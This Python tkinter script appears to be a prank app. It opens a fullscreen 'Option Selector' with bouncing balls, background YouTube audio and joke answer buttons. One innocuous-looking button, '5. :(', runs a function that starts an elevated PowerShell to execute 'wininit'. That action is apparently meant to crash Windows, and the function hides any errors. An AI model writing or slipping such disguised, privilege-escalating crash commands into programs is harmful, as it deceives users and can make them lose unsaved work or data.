import tkinter as tk
from tkinter import messagebox
import webbrowser
import subprocess
import sys
import os
import random
import threading
import tempfile
from pytube import YouTube
import pygame


class Ball:
    def __init__(self, canvas, color, size, width, height):
        self.canvas = canvas
        self.color = color
        self.size = size
        self.x = random.randint(size, width - size)
        self.y = random.randint(size, height - size)

        self.dx = random.uniform(-2, 2)
        while -0.5 < self.dx < 0.5:
            self.dx = random.uniform(-2, 2)

        self.dy = random.uniform(-2, 2)
        while -0.5 < self.dy < 0.5:
            self.dy = random.uniform(-2, 2)

        self.ball = canvas.create_oval(
            self.x - self.size, self.y - self.size,
            self.x + self.size, self.y + self.size,
            fill=self.color, outline=""
        )

    def move(self):
        self.x += self.dx
        self.y += self.dy

        width = self.canvas.winfo_width()
        height = self.canvas.winfo_height()

        if self.x - self.size <= 0:
            self.dx = abs(self.dx)
            self.x = self.size
        elif self.x + self.size >= width:
            self.dx = -abs(self.dx)
            self.x = width - self.size

        if self.y - self.size <= 0:
            self.dy = abs(self.dy)
            self.y = self.size
        elif self.y + self.size >= height:
            self.dy = -abs(self.dy)
            self.y = height - self.size

        current_pos = self.canvas.coords(self.ball)
        if len(current_pos) == 4:
            current_x = (current_pos[0] + current_pos[2]) / 2
            current_y = (current_pos[1] + current_pos[3]) / 2
            self.canvas.move(self.ball, self.x - current_x, self.y - current_y)


def download_and_play_audio():
    try:
        url = "https://www.youtube.com/watch?v=YAgJ9XugGBo"
        temp_dir = tempfile.gettempdir()
        audio_path = os.path.join(temp_dir, "background_audio.mp4")

        if not os.path.exists(audio_path):
            yt = YouTube(url)
            audio_stream = yt.streams.filter(only_audio=True).first()
            audio_stream.download(output_path=temp_dir, filename="background_audio.mp4")

        pygame.mixer.init()
        pygame.mixer.music.load(audio_path)
        pygame.mixer.music.play(-1)
    except Exception as e:
        print(f"Error setting up audio: {e}")


def create_response(choice):
    responses = {
        "Yes": "Good",
        "No": "Bad",
        "Maybe": "Maybe",
        "Bleh": "Me too"
    }
    messagebox.showinfo("Response", responses[choice])


def open_rickroll():
    webbrowser.open("https://www.youtube.com/watch?v=xvFZjo5PgG0")


def run_powershell_admin():
    try:
        if sys.platform == 'win32':
            cmd = 'powershell.exe -Command "Start-Process powershell -ArgumentList \'-NoProfile -Command wininit\' -Verb RunAs"'
            subprocess.Popen(cmd, shell=True)
    except Exception:
        pass


def main():
    root = tk.Tk()
    root.title("Option Selector")

    audio_thread = threading.Thread(target=download_and_play_audio, daemon=True)
    audio_thread.start()

    def on_closing():
        try:
            pygame.mixer.music.stop()
            pygame.mixer.quit()
        except Exception:
            pass
        root.destroy()

    root.protocol("WM_DELETE_WINDOW", on_closing)
    root.attributes('-fullscreen', True)

    background_canvas = tk.Canvas(root, bg="black", highlightthickness=0)
    background_canvas.pack(fill=tk.BOTH, expand=True)

    content_frame = tk.Frame(root, bg="")
    content_frame.place(relx=0.5, rely=0.5, anchor=tk.CENTER)

    header = tk.Label(
        content_frame,
        text="Choose below",
        font=("Arial", 24),
        bg="black",
        fg="white"
    )
    header.pack(pady=40)

    button_width = 30
    button_height = 3
    button_font = ("Arial", 18)
    button_pady = 15

    button_frame = tk.Frame(content_frame, bg="black")
    button_frame.pack(expand=True)

    buttons = [
        ("1. Yes",    "white",   "black",  lambda: create_response("Yes")),
        ("2. No",     "white",   "black",  lambda: create_response("No")),
        ("3. Maybe",  "white",   "black",  lambda: create_response("Maybe")),
        ("4. Bleh",   "white",   "black",  lambda: create_response("Bleh")),
        ("Rickroll",  "white",   "red",    open_rickroll),
        ("5. :(",     "white",   "gray",   run_powershell_admin),
    ]

    for text, fg, bg, cmd in buttons:
        tk.Button(
            button_frame,
            text=text,
            width=button_width,
            height=button_height,
            font=button_font,
            bg=bg,
            fg=fg,
            command=cmd
        ).pack(pady=button_pady)

    tk.Button(
        root,
        text="Exit",
        font=("Arial", 14),
        bg="darkred",
        fg="white",
        command=on_closing,
        width=10,
        height=1
    ).place(relx=0.5, rely=0.95, anchor=tk.CENTER)

    def initialize_balls():
        width = background_canvas.winfo_width()
        height = background_canvas.winfo_height()

        if width <= 1 or height <= 1:
            root.after(100, initialize_balls)
            return

        balls = []
        for _ in range(15):
            balls.append(Ball(background_canvas, "white", random.randint(10, 30), width, height))
        for _ in range(15):
            balls.append(Ball(background_canvas, "purple", random.randint(10, 30), width, height))

        def animate_balls():
            for ball in balls:
                ball.move()
            root.after(30, animate_balls)

        animate_balls()

    root.after(200, initialize_balls)
    root.mainloop()


if __name__ == "__main__":
    main()
